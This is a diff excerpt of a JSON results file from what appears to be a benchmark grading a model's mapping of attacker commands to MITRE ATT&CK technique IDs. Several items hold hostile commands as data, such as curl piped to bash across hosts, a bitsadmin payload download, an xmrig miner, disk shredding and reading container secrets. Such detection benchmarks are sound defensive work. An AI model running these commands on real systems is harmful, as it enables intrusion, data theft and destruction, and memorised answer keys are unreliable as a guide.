+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1107.3
+    },
+    {
+      "id": 101,
+      "gt": "T1220",
+      "command": "msxsl.exe {PATH:.xml} {PATH:.xsl}",
+      "claude_top3": [
+        "T1220",
+        "T1059",
+        "T1105"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1126.3
+    },
+    {
+      "id": 102,
+      "gt": "T1531",
+      "command": "Set-ADAccountPassword",
+      "claude_top3": [
+        "T1098",
+        "T1078",
+        "T1003"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1677.2
+    },
+    {
+      "id": 103,
+      "gt": "T1570",
+      "command": "ufile.io",
+      "claude_top3": [
+        "T1567",
+        "T1105",
+        "T1041"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1314.2
+    },
+    {
+      "id": 104,
+      "gt": "T1580",
+      "command": "ListBuckets",
+      "claude_top3": [
+        "T1619",
+        "T1580",
+        "T1526"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 2125.2
+    },
+    {
+      "id": 105,
+      "gt": "T1530",
+      "command": "New-Item -ItemType Directory -Path $fileSharePath",
+      "claude_top3": [
+        "T1059",
+        "T1105",
+        "T1039"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 2612.3
+    },
+    {
+      "id": 106,
+      "gt": "T1652",
+      "command": "driverquery /v /fo list",
+      "claude_top3": [
+        "T1082",
+        "T1518",
+        "T1057"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1864.8
+    },
+    {
+      "id": 107,
+      "gt": "T1006",
+      "command": "dd if=\\\\.\\PhysicalDrive0 of=C:\\Users\\Public\\mbr.bin bs=512 count=1",
+      "claude_top3": [
+        "T1003",
+        "T1005",
+        "T1485"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1551.4
+    },
+    {
+      "id": 108,
+      "gt": "T1010",
+      "command": "wmctrl -lp",
+      "claude_top3": [
+        "T1010",
+        "T1057",
+        "T1082"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1636.0
+    },
+    {
+      "id": 109,
+      "gt": "T1025",
+      "command": "cp -r /media/usb0/Finance/Q4 /srv/stage/removable-copy",
+      "claude_top3": [
+        "T1119",
+        "T1025",
+        "T1074"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 1215.4
+    },
+    {
+      "id": 110,
+      "gt": "T1039",
+      "command": "mount -t cifs //10.0.0.25/eng /mnt/eng -o username=svc-backup,password='Winter2024!' && rsync -a /mnt/eng/ /var/tmp/eng_stage/",
+      "claude_top3": [
+        "T1021",
+        "T1039",
+        "T1074"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": true,
+      "claude_ms": 2614.1
+    },
+    {
+      "id": 111,
+      "gt": "T1072",
+      "command": "ansible all -i hosts.ini -m shell -a 'curl -fsSL http://10.0.0.5/bootstrap.sh | bash' -u deploy",
+      "claude_top3": [
+        "T1105",
+        "T1059",
+        "T1021"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1318.0
+    },
+    {
+      "id": 112,
+      "gt": "T1120",
+      "command": "lsusb -v",
+      "claude_top3": [
+        "T1120",
+        "T1082",
+        "T1083"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1895.3
+    },
+    {
+      "id": 113,
+      "gt": "T1123",
+      "command": "arecord -D hw:0,0 -f cd -d 300 /tmp/meet.wav",
+      "claude_top3": [
+        "T1123",
+        "T1005",
+        "T1074"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1289.9
+    },
+    {
+      "id": 114,
+      "gt": "T1197",
+      "command": "bitsadmin /create updater && bitsadmin /addfile updater http://10.0.0.12/payload.dll C:\\ProgramData\\updater.dll && bitsadmin /resume updater",
+      "claude_top3": [
+        "T1197",
+        "T1105",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1523.6
+    },
+    {
+      "id": 115,
+      "gt": "T1496",
+      "command": "xmrig -o pool.supportxmr.com:443 -u 49d.example.worker1 -k --tls --cpu-max-threads-hint=90",
+      "claude_top3": [
+        "T1496",
+        "T1571",
+        "T1059"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1915.7
+    },
+    {
+      "id": 116,
+      "gt": "T1561",
+      "command": "shred -n 3 -z /dev/sdb",
+      "claude_top3": [
+        "T1561",
+        "T1485",
+        "T1070"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1436.4
+    },
+    {
+      "id": 117,
+      "gt": "T1609",
+      "command": "docker exec -it payments-db bash -lc 'cat /run/secrets/db_password && id && uname -a'",
+      "claude_top3": [
+        "T1552",
+        "T1059",
+        "T1082"
+      ],
+      "claude_top1_correct": false,
+      "claude_top3_correct": false,
+      "claude_ms": 1376.6
+    },
+    {
+      "id": 118,
+      "gt": "T1610",
+      "command": "docker run -d --name updater --restart unless-stopped -v /:/host -e MODE=agent ghcr.io/acme/sys-agent:latest",
+      "claude_top3": [
+        "T1610",
+        "T1543",
+        "T1611"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 2200.9
+    },
+    {
+      "id": 119,
+      "gt": "T1613",
+      "command": "docker ps --format '{{.ID}} {{.Image}} {{.Names}}' && docker inspect $(docker ps -q)",
+      "claude_top3": [
+        "T1613",
+        "T1082",
+        "T1033"
+      ],
+      "claude_top1_correct": true,
+      "claude_top3_correct": true,
+      "claude_ms": 1842.3
+    }
   ]
 }
